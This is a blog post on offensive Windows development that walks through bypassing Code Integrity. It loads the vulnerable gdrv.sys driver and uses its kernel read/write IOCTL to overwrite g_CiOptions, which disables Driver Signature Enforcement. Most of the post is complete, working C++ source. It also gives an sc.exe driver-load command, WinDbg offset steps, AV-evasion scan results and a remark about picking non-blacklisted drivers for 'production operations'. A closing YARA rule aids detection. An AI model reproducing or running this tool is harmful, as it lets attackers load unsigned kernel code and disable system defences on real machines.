# https://medium.com/@s12deff/bypassing-code-integrity-using-byovd-for-kernel-r-w-primitives-8135087e1c1e

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fbypassing-code-integrity-using-byovd-for-kernel-r-w-primitives-8135087e1c1e&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fbypassing-code-integrity-using-byovd-for-kernel-r-w-primitives-8135087e1c1e&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# **Bypassing** Code Integrity **Using BYOVD for Kernel R/W Primitives**

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:32:32/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---byline--8135087e1c1e---------------------------------------)

[S12 - 0x12Dark Development](https://medium.com/@s12deff?source=post_page---byline--8135087e1c1e---------------------------------------)

Follow

14 min read

·

Mar 26, 2026

15

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D8135087e1c1e&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fbypassing-code-integrity-using-byovd-for-kernel-r-w-primitives-8135087e1c1e&source=---header_actions--8135087e1c1e---------------------post_audio_button------------------)

Share

Welcome to this new Medium post, in this one we will explore a technique used in offensive security that allows us to bypass CI ( **Code Integrity “** Policies”) by abusing a vulnerable driver.

### **Code Integrity** Policies

At its simplest, **Code Integrity (CI)** is the part of Windows that checks if a file ( **.exe, .dll, .sy** s, …) is “good” before letting it run. It looks for a digital signature to prove the file hasn’t been changed by a hacker.

**CI Policies** are the rules for this process. They don’t just check for a signature; they define **which** signatures are allowed and **how** strict the system should be

Here are the main features that make up these policies:

- **CI (Code Integrity):** The master engine. It checks the hash of a file to make sure it hasn’t been modified by a hacker or corrupted
- **DSE (Driver Signature Enforcement):** This is like the policeman for drivers. It forces every driver to have a valid digital signature from Microsoft or a trusted authority before it can touch the computer’s hardware
- **Test Mode (Test Signing):** A special “developer mode.” When this is on, Windows allows drivers that are signed with unofficial, self-made certificates. This is a common target for bypasses.
- **UMCI (User-Mode Code Integrity):** This extends the rules to normal apps (like `.exe` or `.dll` files). It ensures that only approved programs can start, not just any downloaded file.
- **Audit Mode:** A silent version of the policy. Instead of blocking an unsigned driver, it lets it run but writes a warning in the system logs. Attackers love to flip the system into this mode to stay invisible.

I strongly recommend to you, specially if you are not aware about Windows kernel offensive development to read the past related posts from this list:

[**List: BYOVD \| Curated by S12 - 0x12Dark Development \| Medium** \\
\\
**BYOVD · 3 stories on Medium**\\
\\
medium.com](https://medium.com/@s12deff/list/byovd-2e2fe179130e?source=post_page-----8135087e1c1e---------------------------------------)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*6sUdYm7TpHyrsWui79vdWw.png)

**Courses:** Learn how offensive development works on Windows OS from beginner to advanced taking our courses, all explained in C++.

[**All Courses** \\
\\
**Learn how real Windows offensive development works**\\
\\
0x12darkdev.net](https://0x12darkdev.net/courses/?origin=medium&source=post_page-----8135087e1c1e---------------------------------------)

**Technique Database:** Access 70+ real offensive techniques with weekly updates, complete with code, PoCs, and AV scan results:

[**Malware Techniques Database** \\
\\
**Explore an ever-growing collection of techniques**\\
\\
0x12darkdev.net](https://0x12darkdev.net/techniques/?source=post_page-----8135087e1c1e---------------------------------------)

**Modules**: Dive deep into essential offensive topics with our modular **text-training** program! Get a new module every 14 days. Start at just **$1.99 per module**, or unlock **lifetime access to all modules for $100**.

[**0x12 Dark Development** \\
\\
**Learn the best offensive techniques for Windows OS, with content ranging from beginner to advanced levels. All…**\\
\\
0x12darkdev.net](https://0x12darkdev.net/modules?source=post_page-----8135087e1c1e---------------------------------------)

## Methodology

Before we dive into the C++ code, let’s look at the recipe. The goal is to move from a standard user to having full control over the Kernel by tricking the **Code Integrity** system.

To achieve **t** his bypass we need to follow these logical steps:

1. **Prepare the Privileges:** First, our application needs special permission to talk deeply with the system. We enable **SeDebugPrivilege**. This allows our process to inspect and interact with other powerful parts of Windows, to do this you will need **Administrator** rights.
2. **Locate the Target (Finding**`ci.dll` **):** We need to find where the **c** i.dll is stored in the computer’s memory. We do this by listing all the drivers currently loaded in the system until we find the base address of `ci.dll`. This file is where the `g_CiOptions` master switch lives.
3. **Calculate the Offset:** Since every version of Windows is different, the (`g_CiOptions`) isn't always in the same spot inside `ci.dll`. We use **offsets** (specific distances in memory) to find the exact location of the bitmask.
4. **The BYOVD Bridge (Kernel R/W):** We cannot simply write to Kernel memory from a normal app. We load a legitimate but vulnerable driver (the BYOVD). We use a vulnerability in this driver as a **bridge** to reach into the Kernel and overwrite the `g_CiOptions` value.
5. **Flipping the Switch:** Finally, we change the bitmask (for example, from `0x6` to `0x0` or `0x8`). By doing this, we instantly disable DSE (Driver Signature Enforcement). Now, the system will allow us to load our own custom, unsigned driver without any errors.

## Implementation

Now, let’s look at how to translate that logic into C++ code. I have broken down the most important parts.

### **Prepare the Privileges**

To activate the **SeDebugPrivilege** in our process token we can simply execute this function:

```
BOOL EnableSeDebugPrivilege(){
 HANDLE hToken;
 TOKEN_PRIVILEGES tp;
 LUID luid;
 if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 {
  std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
  return FALSE;
 }
 if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
 {
  std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
  CloseHandle(hToken);
  return FALSE;
 }
 tp.PrivilegeCount = 1;
 tp.Privileges[0].Luid = luid;
 tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
 {
  std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
  CloseHandle(hToken);
  return FALSE;
 }
 CloseHandle(hToken);
 return TRUE;
}
```

Just with this, our process token receive the privilege to perform debugging operations directly to other processes.

### Locate the Target (Finding ci.dll)

This step is not that easy than the previous one, the current one requires of two different steps:

1. **List all the kernel drivers**
2. **Get ci.dll base address**

This can be done with just one function, in my case, I used two different ones.

**List all the kernel drivers**

```
std::vector<KernelDriver> GetSortedKernelDrivers() {
 std::vector<KernelDriver> driverList;

 auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
  GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

 if (!NtQuerySystemInformation) return driverList;

 ULONG len = 0;
 const int SystemModuleInformation = 11;

 NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);

 std::vector<BYTE> buffer(len);
 NTSTATUS status = NtQuerySystemInformation(
  (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
  buffer.data(),
  len,
  &len
 );

 if (status != 0) return driverList; // STATUS_SUCCESS = 0

 auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());

 for (ULONG i = 0; i < mods->Count; i++) {
  SYSTEM_MODULE_ENTRY& entry = mods->Modules[i];

  KernelDriver drv;
  drv.BaseAddress = reinterpret_cast<uintptr_t>(entry.ImageBase);
  drv.Size = entry.ImageSize;

  const char* nameStart = reinterpret_cast<const char*>(entry.FullPathName) + entry.OffsetToFileName;
  drv.Name = std::string(nameStart);

  driverList.push_back(drv);
 }

 std::sort(driverList.begin(), driverList.end(), [](const KernelDriver& a, const KernelDriver& b) {
  return a.BaseAddress < b.BaseAddress;
  });

 return driverList;
}
```

This function uses `NtQuerySystemInformation` to retrieve a list of all loaded kernel drivers, extracting their base address, size, and name into a vector. Finally, it sorts the drivers by their base address.

**Get ci.dll base address**

Using the list (vector) of drivers returned by the previous function, we can just get the base address of the ci.dll one:

```
DWORD64 GetCIBase(const std::vector<KernelDriver>& drivers) {
 if (drivers.empty()) {
  return 0;
 }

 for (const auto& drv : drivers) {
  std::string nameLower = drv.Name;
  std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

  if (nameLower.find("ci.dll") != std::string::npos ||
   nameLower.find("ci") != std::string::npos) {
   return (DWORD64)drv.BaseAddress;
  }
 }

 return 0;
}
```

### **Calculate the Offset**

Then it’s time to get the offset, but exactly which offset?

We are searching for the offset between the **ci.dll** base address and the **g\_CiOptions** field (it’s inside the ci.dll).

You can use various methods to do this (resolving the symbols online, hardcoding all the offsets list of all the versions…), in our case we use a simplest way just for testing. We use **WinDbg** to find this offset.

## Get S12 - 0x12Dark Development’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

To do this you need to install and open the **WinDbg** application, then attach the kernel and run the following commands:

```
lkd> .symfix
lkd> .reload
lkd> lm m CI
lkd > x CI!g_CiOptions
lkd > ? CI!g_CiOptions - CI
Evaluate expression : 327684 = 00000000`00050004
```

Let’s check the output:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*XXQvy0METcxWO0cTZiVNoQ.png)

The important output is this one:

```
Evaluate expression : 327684 = 00000000`00050004
```

We need to set the last part of this value into our offset structure:

```
struct offsets {
	ULONG64 FromCItoC_giOptions;
} g_offsets = {
	0x50004 // MaldevWin11 machine
	//0x4d004 // Win11 test sandboxes
};
```

And now we got the offset, so if we start from the base address of the **ci.dll** and we add the offset, we arrive at the exact memory location of **g\_CiOptions**

### **Kernel R/W**

Now we got the address that we need to manipulate, but remember, this address is in the kernel, so we need to exploit a vulnerable driver to perform **Read and Write Kernel** operations.

I will not explain the whole process another time (I just done in all the previous posts from this list), so my recommendation, just read this post:

[**Exploiting a Kernel Read/Write Primitive using BYOVD** \\
\\
**Welcome to this new Medium post. In today’s article, we will look at how kernel read and write primitives can be…**\\
\\
medium.com](https://medium.com/@s12deff/exploiting-a-kernel-read-write-primitive-using-byovd-977d7b7dfc01?source=post_page-----8135087e1c1e---------------------------------------)

In summary, we are using the same vulnerable driver:

[**2bea1bca-753c-4f09-bc9f-566ab0193f4a** \\
\\
**gdrv.sys Description gdrv.sys is vulnerable to multiple CVEs: CVE-2018-19320, CVE-2018-19322, CVE-2018-19323…**\\
\\
www.loldrivers.io](https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/?source=post_page-----8135087e1c1e---------------------------------------)

And then just load the driver from an **administrator cmd**

```
sc.exe create gdrv.sys binPath=C:\windows\temp\gdrv.sys type=kernel && sc.exe start gdrv.sys
```

In this case is not the best driver, why? Because it’s one of the most exploited in the history, that means is in the Windows blacklist, so if you want to load this driver, you need to have disabled various of the **Code Integrity** policies.

But in a production operation we need to use a vulnerable driver not listed in the blacklist yet, also needs to have **R/W Kernel** primitives.

Then we just declare the read and write primitives:

```
BOOL WritePrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
 KernelWritePrimitive kwp;
 kwp.dst = dst;
 kwp.src = src;
 kwp.size = size;

 BYTE bufferReturned[48] = { 0 };
 DWORD returned = 0;
 BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&kwp, sizeof(kwp), (LPVOID)bufferReturned, sizeof(bufferReturned), &returned, nullptr);
 if (!result) {
  cout << "Failed to send write primitive. Error code: " << GetLastError() << endl;
  return FALSE;
 }
 cout << "Write primitive sent successfully. Bytes returned: " << returned << endl;
 return TRUE;
}

BOOL ReadPrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
 KernelReadPrimitive krp;
 krp.dst = dst;
 krp.src = src;
 krp.size = size;

 DWORD returned = 0;

 BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&krp, sizeof(krp), (LPVOID)dst, size, &returned, nullptr);
 if (!result) {
  cout << "Failed to send read primitive. Error code: " << GetLastError() << endl;
  return FALSE;
 }
 cout << "Read primitive sent successfully. Bytes returned: " << returned << endl;
 return TRUE;
}
```

### **Flipping the Switch**

And then, we just need to modify the **g\_CiOptions** using the kernel write primitive:

```
BOOL disableDSE(HANDLE drv, DWORD64 ciBaseAddress) {
 DWORD64 ci_optionsAddress = ciBaseAddress + g_offsets.FromCItoC_giOptions;
 //cout << "g_CiOptions Address " << ciBaseAddress;
 cout << "g_CiOptions Address: 0x" << hex << ci_optionsAddress << endl;

 // Values
 // Bitmask

 // --- Single bits ---
 // 0x0 = Active (CI fully enforced)
 // 0x1 = Disable code integrity
 // 0x2 = Test Signing Mode
 // 0x4 = Chill Checks
 // 0x8 = Permissive, partial bypass

 // --- Combined ---
 // 0x3 = Disable CI + Test Signing
 // 0x5 = Disable CI + Chill Checks
 // 0x6 = Test Signing + Chill Checks
 // 0x7 = Disable CI + Test Signing + Chill Checks
 // 0x9 = Disable CI + Permissive
 // 0xA = Test Signing + Permissive
 // 0xB = Disable CI + Test Signing + Permissive
 // 0xC = Chill Checks + Permissive
 // 0xD = Disable CI + Chill Checks + Permissive
 // 0xE = Test Signing + Chill Checks + Permissive
 // 0xF = All flags (Disable CI + Test Signing + Chill Checks + Permissive)

 BYTE currentValue = 0;
 ReadPrimitive(drv, (LPVOID)&currentValue, (LPVOID)ci_optionsAddress, sizeof(BYTE));
 cout << "g_CiOptions before: 0x" << hex << (int)currentValue << endl;

 BYTE newValue = 0xF;
 BOOL resultWritten = WritePrimitive(drv, (LPVOID)ci_optionsAddress, (LPVOID)&newValue, sizeof(BYTE));
 if (resultWritten) {
  cout << "New bytes written into DSE field " << endl;
  ReadPrimitive(drv, (LPVOID)&currentValue, (LPVOID)ci_optionsAddress, sizeof(BYTE));
  cout << "g_CiOptions after:  0x" << hex << (int)currentValue << endl;
  return TRUE;
 }
 else {
  return FALSE;
 }
}
```

In this case we are adding to read primitives to show the value before and after the modification. But is not strictly necessary.

## Code

**main.cpp**

```
#include <Windows.h>
#include <winternl.h>
#include <vector>
#include <string>
#include <algorithm>
#include <iostream>
#include "DriverOps.h"

using namespace std;

typedef struct _SYSTEM_MODULE_ENTRY {
 HANDLE Section;
 PVOID MappedBase;
 PVOID ImageBase;
 ULONG ImageSize;
 ULONG Flags;
 USHORT LoadOrderIndex;
 USHORT InitOrderIndex;
 USHORT LoadCount;
 USHORT OffsetToFileName;
 UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
 ULONG Count;
 SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

struct KernelDriver {
 std::string Name;
 uintptr_t BaseAddress;
 uint32_t Size;
};

typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
 SYSTEM_INFORMATION_CLASS SystemInformationClass,
 PVOID SystemInformation,
 ULONG SystemInformationLength,
 PULONG ReturnLength
 );

// 1- Enable SeDebugPrivilege for the current process
// 2- Get offsets (hardcoded)
// 3- List all drivers
// 4. Get CI.dll address
// 5. Disable DSE

// lkd> lm m CI
// lkd > x CI!g_CiOptions
// lkd > ? CI!g_CiOptions - CI
//Evaluate expression : 327684 = 00000000`00050004

struct offsets {
 ULONG64 FromCItoC_giOptions;
} g_offsets = {
 //0x50004 // MaldevWin11 machine
 0x4d004 // Win11 test sandboxes
};

std::vector<KernelDriver> GetSortedKernelDrivers() {
 std::vector<KernelDriver> driverList;

 auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
  GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

 if (!NtQuerySystemInformation) return driverList;

 ULONG len = 0;
 const int SystemModuleInformation = 11;

 NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);

 std::vector<BYTE> buffer(len);
 NTSTATUS status = NtQuerySystemInformation(
  (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
  buffer.data(),
  len,
  &len
 );

 if (status != 0) return driverList; // STATUS_SUCCESS = 0

 auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());

 for (ULONG i = 0; i < mods->Count; i++) {
  SYSTEM_MODULE_ENTRY& entry = mods->Modules[i];

  KernelDriver drv;
  drv.BaseAddress = reinterpret_cast<uintptr_t>(entry.ImageBase);
  drv.Size = entry.ImageSize;

  const char* nameStart = reinterpret_cast<const char*>(entry.FullPathName) + entry.OffsetToFileName;
  drv.Name = std::string(nameStart);

  driverList.push_back(drv);
 }

 std::sort(driverList.begin(), driverList.end(), [](const KernelDriver& a, const KernelDriver& b) {
  return a.BaseAddress < b.BaseAddress;
  });

 return driverList;
}

DWORD64 GetCIBase(const std::vector<KernelDriver>& drivers) {
 if (drivers.empty()) {
  return 0;
 }

 for (const auto& drv : drivers) {
  std::string nameLower = drv.Name;
  std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

  if (nameLower.find("ci.dll") != std::string::npos ||
   nameLower.find("ci") != std::string::npos) {
   return (DWORD64)drv.BaseAddress;
  }
 }

 return 0;
}

BOOL disableDSE(HANDLE drv, DWORD64 ciBaseAddress) {
 DWORD64 ci_optionsAddress = ciBaseAddress + g_offsets.FromCItoC_giOptions;
 //cout << "g_CiOptions Address " << ciBaseAddress;
 cout << "g_CiOptions Address: 0x" << hex << ci_optionsAddress << endl;

 // Values
 // Bitmask

 // --- Single bits ---
 // 0x0 = Active (CI fully enforced)
 // 0x1 = Disable code integrity
 // 0x2 = Test Signing Mode
 // 0x4 = Chill Checks
 // 0x8 = Permissive, partial bypass

 // --- Combined ---
 // 0x3 = Disable CI + Test Signing
 // 0x5 = Disable CI + Chill Checks
 // 0x6 = Test Signing + Chill Checks
 // 0x7 = Disable CI + Test Signing + Chill Checks
 // 0x9 = Disable CI + Permissive
 // 0xA = Test Signing + Permissive
 // 0xB = Disable CI + Test Signing + Permissive
 // 0xC = Chill Checks + Permissive
 // 0xD = Disable CI + Chill Checks + Permissive
 // 0xE = Test Signing + Chill Checks + Permissive
 // 0xF = All flags (Disable CI + Test Signing + Chill Checks + Permissive)

 BYTE currentValue = 0;
 ReadPrimitive(drv, (LPVOID)&currentValue, (LPVOID)ci_optionsAddress, sizeof(BYTE));
 cout << "g_CiOptions before: 0x" << hex << (int)currentValue << endl;

 BYTE newValue = 0xF;
 BOOL resultWritten = WritePrimitive(drv, (LPVOID)ci_optionsAddress, (LPVOID)&newValue, sizeof(BYTE));
 if (resultWritten) {
  cout << "New bytes written into DSE field " << endl;
  ReadPrimitive(drv, (LPVOID)&currentValue, (LPVOID)ci_optionsAddress, sizeof(BYTE));
  cout << "g_CiOptions after:  0x" << hex << (int)currentValue << endl;
  return TRUE;
 }
 else {
  return FALSE;
 }
}

BOOL EnableSeDebugPrivilege()
{
 HANDLE hToken;
 TOKEN_PRIVILEGES tp;
 LUID luid;
 if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 {
  std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
  return FALSE;
 }
 if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
 {
  std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
  CloseHandle(hToken);
  return FALSE;
 }
 tp.PrivilegeCount = 1;
 tp.Privileges[0].Luid = luid;
 tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
 {
  std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
  CloseHandle(hToken);
  return FALSE;
 }
 CloseHandle(hToken);
 return TRUE;
}

int main(int argc, char* argv[])
{
 // 1. Enable SeDebugPrivilege for the current process
 BOOL setPriv = EnableSeDebugPrivilege();

 // 2. Get offsets (hardcoded)

 // 3. List all drivers
 vector<KernelDriver> drivers = GetSortedKernelDrivers();

 // 4. Get CI.dll address
 DWORD64 ciDLLBase = GetCIBase(drivers);
 cout << "CI.dll Base address " << ciDLLBase << endl;
 getchar();

 HANDLE drv = openVulnDriver();
 if (drv == NULL || drv == INVALID_HANDLE_VALUE) {
  cout << "Error opening driver" << endl;
  return -1;
 }

 // 5. Disable DSE
 BOOL result = disableDSE(drv, ciDLLBase);
 return 0;
}
```

**DriverOps.h**

```
#include <iostream>
#include <Windows.h>

// https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/

#define IOCTL_READWRITE_PRIMITIVE 0xC3502808

using namespace std;

typedef struct KernelWritePrimitive {
 LPVOID dst;
 LPVOID src;
 DWORD size;
} KernelWritePrimitive;

typedef struct KernelReadPrimitive {
 LPVOID dst;
 LPVOID src;
 DWORD size;
} KernelReadPrimitive;

BOOL WritePrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
 KernelWritePrimitive kwp;
 kwp.dst = dst;
 kwp.src = src;
 kwp.size = size;

 BYTE bufferReturned[48] = { 0 };
 DWORD returned = 0;
 BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&kwp, sizeof(kwp), (LPVOID)bufferReturned, sizeof(bufferReturned), &returned, nullptr);
 if (!result) {
  cout << "Failed to send write primitive. Error code: " << GetLastError() << endl;
  return FALSE;
 }
 cout << "Write primitive sent successfully. Bytes returned: " << returned << endl;
 return TRUE;
}

BOOL ReadPrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
 KernelReadPrimitive krp;
 krp.dst = dst;
 krp.src = src;
 krp.size = size;

 DWORD returned = 0;

 BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&krp, sizeof(krp), (LPVOID)dst, size, &returned, nullptr);
 if (!result) {
  cout << "Failed to send read primitive. Error code: " << GetLastError() << endl;
  return FALSE;
 }
 cout << "Read primitive sent successfully. Bytes returned: " << returned << endl;
 return TRUE;
}

HANDLE openVulnDriver() {
 HANDLE driver = CreateFileA("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 if (!driver || driver == INVALID_HANDLE_VALUE)
 {
  cout << "Failed to open handle to driver. Error code: " << GetLastError() << endl;
  return NULL;
 }
 return driver;
}
```

## Proof of Concept

**Windows 11:**

So if we run the code (after loading the driver):

![](https://miro.medium.com/v2/resize:fit:522/1*EOnt_w_ZbHGX3VkLMTmNJQ.png)

## Detection

Now it’s time to see if the defenses are detecting this as a malicious threat.

In this case we are just performing static analysis to the compiled **.exe** because with this blacklisted driver is impossible to analyze dynamically without getting detected.

But I tried with non blacklisted driver and it’s evading main free AV ( **Bitdefender and Kasperky**) but it’s detected by **Elastic EDR**

### Kleenscan

```
This file was detected by [1 / 36] engine(s)

SecureAge APEX [2026-03-25]
Detected
```

### Litterbox

Static Analysis:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*y0QBjOrRQFemzs7QvT8igQ.png)

### ThreatCheck

```
ThreatCheck.exe -f Z:\DSEDisableFromRWKernel.exe
[+] No threat found!
[*] Run time: 0.55s
```

### Windows Defender

![](https://miro.medium.com/v2/resize:fit:558/1*yuMLs7NVOE5b4Xz3-h6wmw.png)

### YARA

Here a YARA rule to detect this technique:

```
rule Win_Kernel_CI_Bypass_BYOVD {
    meta:
        description = "Detects tools that attempt to bypass Windows Code Integrity (DSE) by patching g_CiOptions using BYOVD techniques"
        author = "0x12 Dark Development"
        date = "2026-03-26"
        technique = "BYOVD - Driver Signature Enforcement Bypass"
        reference = "https://medium.com/@0x12darkdev"
        severity = "High"

    strings:
        // Privilege escalation indicators
        $s1 = "SeDebugPrivilege" ascii wide
        $s2 = "AdjustTokenPrivileges" ascii wide

        // Kernel module enumeration
        $s3 = "NtQuerySystemInformation" ascii wide
        $s4 = "EnumDeviceDrivers" ascii wide

        // Target Identification
        $t1 = "ci.dll" ascii wide nocase
        $t2 = "g_CiOptions" ascii wide

        // Driver Communication (Generic)
        $d1 = "\\\\.\\" ascii wide
        $d2 = "DeviceIoControl" ascii wide

        // Hex patterns for g_CiOptions bitmask manipulation (0x0 to 0xF)
        $hex_bitmask = { C6 [0-3] 0F } // mov byte ptr [reg], 0x0F (Disabling all)

    condition:
        uint16(0) == 0x5A4D and
        (
            (all of ($s*)) and
            (any of ($t*)) and
            (any of ($d*))
        ) or ($hex_bitmask)
}
```

Here you have my collection of YARA rules:

[**GitHub — S12cybersecurity/YaraRules: Collection of interesting Yara Rules** \\
\\
**Collection of interesting Yara Rules. Contribute to S12cybersecurity/YaraRules development by creating an account on…**\\
\\
github.com](https://github.com/S12cybersecurity/YaraRules?source=post_page-----8135087e1c1e---------------------------------------)

## Conclusions

The **BYOVD (Bring Your Own Vulnerable Driver)** technique remains one of the most effective ways to bypass **Code Integrity Policies** because it turns a legitimate, signed asset against the system itself. By using a kernel read/write primitive to patch `g_CiOptions` in memory, we effectively **blind** the OS, allowing us to load unsigned code into the most privileged areas of Windows.

**📌 Follow me:** [YouTube](https://www.youtube.com/@0x12darkdev) \| 🐦 [X](https://x.com/Salsa12__) \| 💬 [Discord Server](https://discord.gg/K2HqYuj5Tv) \| 📸 [Instagram](https://www.instagram.com/malwaredevs12) \| [Newsletter](https://0x12darkdevelopmentnewsletter.eo.page/q41nr)

We help security teams enhance offensive capabilities with precision-built tooling and expert guidance, from custom implants to advanced evasion strategies

[**Offensive Development Consultant** \\
\\
**We developed specialized offensive implants for security professionals**\\
\\
0x12darkdev.net](https://0x12darkdev.net/offensive-development-services/?source=post_page-----8135087e1c1e---------------------------------------)

**S12.**

[Malware](https://medium.com/tag/malware?source=post_page-----8135087e1c1e---------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----8135087e1c1e---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----8135087e1c1e---------------------------------------)

[Offensive Security](https://medium.com/tag/offensive-security?source=post_page-----8135087e1c1e---------------------------------------)

[Infosec](https://medium.com/tag/infosec?source=post_page-----8135087e1c1e---------------------------------------)

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:48:48/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---post_author_info--8135087e1c1e---------------------------------------)

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:64:64/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---post_author_info--8135087e1c1e---------------------------------------)

Follow

[**Written by S12 - 0x12Dark Development**](https://medium.com/@s12deff?source=post_page---post_author_info--8135087e1c1e---------------------------------------)

[4.1K followers](https://medium.com/@s12deff/followers?source=post_page---post_author_info--8135087e1c1e---------------------------------------)

· [51 following](https://medium.com/@s12deff/following?source=post_page---post_author_info--8135087e1c1e---------------------------------------)

Red Team Enthusiast [https://0x12darkdev.net/](https://0x12darkdev.net/)

Follow

## No responses yet

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fbypassing-code-integrity-using-byovd-for-kernel-r-w-primitives-8135087e1c1e&source=---post_responses--8135087e1c1e---------------------respond_sidebar------------------)

Cancel

Respond

## More from S12 - 0x12Dark Development

[See all from S12 - 0x12Dark Development](https://medium.com/@s12deff?source=post_page---author_recirc--8135087e1c1e---------------------------------------)

## Recommended from Medium

[See more recommendations](https://medium.com/?source=post_page---read_next_recirc--8135087e1c1e---------------------------------------)

[Help](https://help.medium.com/hc/en-us?source=post_page-----8135087e1c1e---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----8135087e1c1e---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----8135087e1c1e---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----8135087e1c1e---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----8135087e1c1e---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----8135087e1c1e---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----8135087e1c1e---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----8135087e1c1e---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----8135087e1c1e---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**